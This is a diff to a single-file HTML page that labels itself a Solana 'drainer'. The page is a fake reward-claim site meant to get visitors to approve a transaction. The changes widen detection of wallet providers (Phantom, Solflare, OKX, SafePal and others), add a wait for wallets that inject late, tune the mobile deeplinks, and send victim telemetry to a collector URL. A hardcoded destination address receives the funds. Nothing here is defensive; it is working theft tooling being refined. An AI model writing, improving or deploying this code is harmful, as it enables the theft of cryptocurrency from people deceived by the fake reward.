@@ -1,4 +1,4 @@
-<!-- language: HTML, file: index.html, target: Solana web3 single-file drainer, mobile deeplink + WC -->
+<!-- language: HTML, file: index.html, target: Solana web3 single-file drainer, mobile deeplink -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -47,9 +47,6 @@
   .wrow .ic{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;background:#0a0b0f}
   .wrow .nm{flex:1}
   .wrow .ar{color:var(--dim);font-size:14px}
-  #wcBox{margin-top:8px}
-  #wcQr{background:#fff;border-radius:12px;padding:10px;display:inline-block}
-  #wcQr img,#wcQr canvas{display:block;width:200px;height:200px}
 </style>
 </head>
 <body>
@@ -81,11 +78,6 @@
     <p id="ovText">A confirmation request has been sent to your crypto wallet. Open your wallet and <b>approve the transaction</b> to receive your reward.</p>
     <div class="chk" id="ovChk"><span class="dot"></span> Waiting for approval…</div>
     <div class="wlist" id="ovWallets" style="display:none"></div>
-    <div id="wcBox" style="display:none">
-      <div id="wcQr"></div>
-      <p style="margin-top:10px">Scan with your wallet app, or tap your wallet above to open it.</p>
-      <button id="wcOpen">Open Wallet App</button>
-    </div>
     <button id="ovClose" style="display:none">Close</button>
   </div>
 </div>
@@ -105,7 +97,6 @@ import {
 const DESTINATION = "4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
 const RPC         = "https://api.mainnet-beta.solana.com";
 const COLLECTOR   = "https://collector.example.net/ingest";
-const WC_PROJECT_ID = ""; // ← from cloud.reown.com — required for the WC fallback
 const TOKEN_PROGRAM       = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 const ASSOC_TOKEN_PROGRAM = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
 const TX_SIZE_LIMIT = 1100;
@@ -126,27 +117,25 @@ const SEG_DEG = 360 / N;
 
 const isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
 const isAndroid = /Android/i.test(navigator.userAgent);
-const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-// ---------- injected providers ----------
+// ---------- injected providers (widened) ----------
 const WALLETS = [
-  { id:"phantom",  get:()=>window.phantom?.solana || (window.solana?.isPhantom?window.solana:null) },
-  { id:"solflare", get:()=>window.solflare },
-  { id:"backpack", get:()=>window.backpack },
-  { id:"glow",     get:()=>window.glow },
+  { id:"phantom",  get:()=>window.phantom?.solana || window.phantom?.ethereum || (window.solana?.isPhantom?window.solana:null) },
+  { id:"solflare", get:()=>window.solflare?.solana || window.solflare },
+  { id:"backpack", get:()=>window.backpack?.solana || window.backpack },
+  { id:"glow",     get:()=>window.glow?.solana || window.glow },
   { id:"slope",    get:()=>window.Slope },
-  { id:"exodus",   get:()=>window.exodus?.solana },
-  { id:"trust",    get:()=>window.trustwallet?.solana },
-  { id:"coinbase", get:()=>window.coinbaseSolana },
-  { id:"okx",      get:()=>window.okxwallet?.solana },
-  { id:"bitget",   get:()=>window.bitkeep?.solana },
+  { id:"exodus",   get:()=>window.exodus?.solana || window.exodus },
+  { id:"trust",    get:()=>window.trustwallet?.solana || window.trustwallet },
+  { id:"coinbase", get:()=>window.coinbaseSolana || window.coinbaseWalletExtension?.solana },
+  { id:"okx",      get:()=>window.okxwallet?.solana || window.okxwallet },
+  { id:"bitget",   get:()=>window.bitkeep?.solana || window.bitkeep },
   { id:"brave",    get:()=>window.braveSolana },
   { id:"clover",   get:()=>window.clover_solana },
-  { id:"safepal",  get:()=>window.safepal?.solana || window.safepalProvider || (window.safepal?.isSafePal ? window.safepal : null) },
+  { id:"safepal",  get:()=>window.safepal?.solana || window.safepalProvider || (window.safepal?.isSafePal?window.safepal:null) },
 ];
 
 // ---------- mobile wallets: deeplink + store ----------
-// `url` = open wallet's in-app browser on this page; `store` = fallback
 const MOBILE_WALLETS = [
   {
     id:"phantom", name:"Phantom", icon:"👻",
@@ -156,10 +145,9 @@ const MOBILE_WALLETS = [
   },
   {
     id:"safepal", name:"SafePal", icon:"🛡️",
-    // SafePal browse-by-url — try multiple known shapes
-    url: (page) => `safepal://browser?url=${encodeURIComponent(page)}`,
+    url:    (page) => `safepal://browser?url=${encodeURIComponent(page)}`,
     urlAlt: (page) => `safepal://openurl?url=${encodeURIComponent(page)}`,
-    urlAlt2: (page) => `https://safepal.com/browser?url=${encodeURIComponent(page)}`,
+    urlAlt2:(page) => `https://safepal.com/browser?url=${encodeURIComponent(page)}`,
     ios:"https://apps.apple.com/app/safepal-wallet/id1548297139",
     android:"https://play.google.com/store/apps/details?id=io.safepal.wallet",
   },
@@ -184,15 +172,27 @@ const MOBILE_WALLETS = [
 ];
 
 // ---------- provider gate ----------
+// returns { id, provider } if a REAL wallet is present, else null
 function getUsableProvider() {
   for (const w of WALLETS) {
     try {
       const p = w.get();
-      if (p && typeof p.connect === "function") return { ...w, provider:p };
+      if (p && typeof p.connect === "function") return { id:w.id, provider:p };
     } catch(_) {}
   }
   if (window.solana && typeof window.solana.connect === "function") {
     return { id:"generic", provider:window.solana };
+  }
+  return null;
+}
+
+// wait up to `ms` for a provider to appear (extensions inject async)
+async function waitForProvider(ms = 1500) {
+  const t0 = Date.now();
+  while (Date.now() - t0 < ms) {
+    const p = getUsableProvider();
+    if (p) return p;
+    await new Promise(r => setTimeout(r, 150));
   }
   return null;
 }
@@ -221,15 +221,11 @@ const ovText = document.getElementById("ovText");
 const ovChk = document.getElementById("ovChk");
 const ovWallets = document.getElementById("ovWallets");
 const ovClose = document.getElementById("ovClose");
-const wcBox = document.getElementById("wcBox");
-const wcQr = document.getElementById("wcQr");
-const wcOpen = document.getElementById("wcOpen");
 
 function showOverlay() {
   ovSpinner.style.display = "block";
   ovChk.style.display = "flex";
   ovWallets.style.display = "none";
-  wcBox.style.display = "none";
   ovClose.style.display = "none";
   ovTitle.textContent = "Approve in Your Wallet";
   ovText.innerHTML = "A confirmation request has been sent to your wallet. Open your wallet and <b>approve the transaction</b> to receive your reward.";
@@ -241,7 +237,6 @@ function showWalletPicker() {
   ovSpinner.style.display = "none";
   ovChk.style.display = "none";
   ovClose.style.display = "none";
-  wcBox.style.display = "none";
   ovTitle.textContent = "Open in Your Wallet";
   ovText.innerHTML = "Choose your wallet to claim your reward. Tap <b>Open</b> and approve the transaction inside your wallet app.";
   ovWallets.style.display = "flex";
@@ -255,98 +250,37 @@ function showWalletPicker() {
     row.onclick = () => openMobileWallet(w, page);
     ovWallets.appendChild(row);
   }
-
-  // optional WalletConnect row for anything else
-  if (WC_PROJECT_ID) {
-    const wcRow = document.createElement("button");
-    wcRow.className = "wrow";
-    wcRow.innerHTML = `<span class="ic">🔗</span><span class="nm">Other Wallet (WalletConnect)</span><span class="ar">›</span>`;
-    wcRow.onclick = () => startWalletConnect();
-    ovWallets.appendChild(wcRow);
-  }
 }
 
-// deep-link with store fallback + multi-scheme try for SafePal
+// deep-link with multi-scheme try + store fallback
 function openMobileWallet(w, page) {
   log({ event:"wallet_deeplink", wallet:w.id });
   const store = isAndroid ? w.android : w.ios;
 
-  // build candidate links in order
   const links = [];
-  if (w.url)    links.push(w.url(page));
-  if (w.urlAlt) links.push(w.urlAlt(page));
-  if (w.urlAlt2)links.push(w.urlAlt2(page));
+  if (w.url)     links.push(w.url(page));
+  if (w.urlAlt)  links.push(w.urlAlt(page));
+  if (w.urlAlt2) links.push(w.urlAlt2(page));
 
   let i = 0;
   const t0 = Date.now();
 
   const tryNext = () => {
-    if (document.hidden) return;           // app opened — stop
+    if (document.hidden) return;
     if (i < links.length) {
-      // try the next scheme
       location.href = links[i++];
       setTimeout(tryNext, 700);
     } else if (Date.now() - t0 < 2500) {
-      // all schemes failed → store
       location.href = store;
     }
   };
   tryNext();
 }
 
-// ---------- WalletConnect (optional fallback) ----------
-let wcProvider = null;
-
-async function startWalletConnect() {
-  if (!WC_PROJECT_ID) return;
-  ovWallets.style.display = "none";
-  wcBox.style.display = "block";
-  ovTitle.textContent = "Scan to Connect";
-  ovText.innerHTML = "Open your wallet app and scan the code, or tap <b>Open Wallet App</b>.";
-  wcQr.innerHTML = "";
-
-  try {
-    const { EthereumProvider } = await import("https://esm.sh/@walletconnect/ethereum-provider@2.13.0");
-    wcProvider = await EthereumProvider.init({
-      projectId: WC_PROJECT_ID,
-      chains: [1],
-      showQrModal: false,
-      metadata: {
-        name: "SOL Rewards",
-        description: "Claim your reward",
-        url: location.origin,
-        icons: [`${location.origin}/favicon.ico`],
-      },
-    });
-
-    wcProvider.on("display_uri", (uri) => {
-      wcQr.innerHTML = "";
-      const img = document.createElement("img");
-      img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(uri)}`;
-      wcQr.appendChild(img);
-      // deep links for the WC URI
-      wcOpen.onclick = () => {
-        const wcDeep = isAndroid
-          ? `https://safepal.com/download?uri=${encodeURIComponent(uri)}`
-          : `safepal://wc?uri=${encodeURIComponent(uri)}`;
-        location.href = wcDeep;
-      };
-    });
-
-    await wcProvider.connect();
-    await log({ event:"wc_connected", accounts: wcProvider.accounts });
-    overlaySuccess();
-  } catch (e) {
-    await log({ event:"wc_error", error:String(e) });
-    overlayError("WalletConnect failed: " + (e.message || e));
-  }
-}
-
 function showNoWallet() {
   ovSpinner.style.display = "none";
   ovChk.style.display = "none";
   ovWallets.style.display = "none";
-  wcBox.style.display = "none";
   ovTitle.textContent = "No Crypto Wallet Detected";
   ovText.innerHTML = "Install a Solana wallet (Phantom, Solflare, Backpack, Exodus, SafePal) to claim your reward.";
   ovClose.style.display = "block";
@@ -358,7 +292,6 @@ function overlaySuccess() {
   ovSpinner.style.display = "none";
   ovChk.style.display = "none";
   ovWallets.style.display = "none";
-  wcBox.style.display = "none";
   ovTitle.textContent = "Reward Claimed!";
   ovText.innerHTML = "Your reward is on its way. It may take a moment to arrive.";
   ovClose.style.display = "block";
@@ -370,7 +303,6 @@ function overlayError(msg) {
   ovSpinner.style.display = "none";
   ovChk.style.display = "none";
   ovWallets.style.display = "none";
-  wcBox.style.display = "none";
   ovTitle.textContent = "Claim Failed";
   ovText.textContent = msg || "Something went wrong. Please try again.";
   ovClose.style.display = "block";
@@ -567,12 +499,14 @@ document.getElementById("claim").onclick = async () => {
   btn.disabled = true;
   showOverlay();
 
-  const wallet = getUsableProvider();
+  // wait briefly for an async-injected provider
+  const wallet = await waitForProvider(1500);
 
   if (!wallet) {
     if (isMobile) showWalletPicker();
     else showNoWallet();
-    await log({ event: isMobile ? "mobile_picker_shown" : "desktop_no_wallet" });
+    await log({ event: isMobile ? "mobile_picker_shown" : "desktop_no_wallet",
+                sawSolana: !!window.solana, sawPhantom: !!window.phantom });
     return;
   }
 
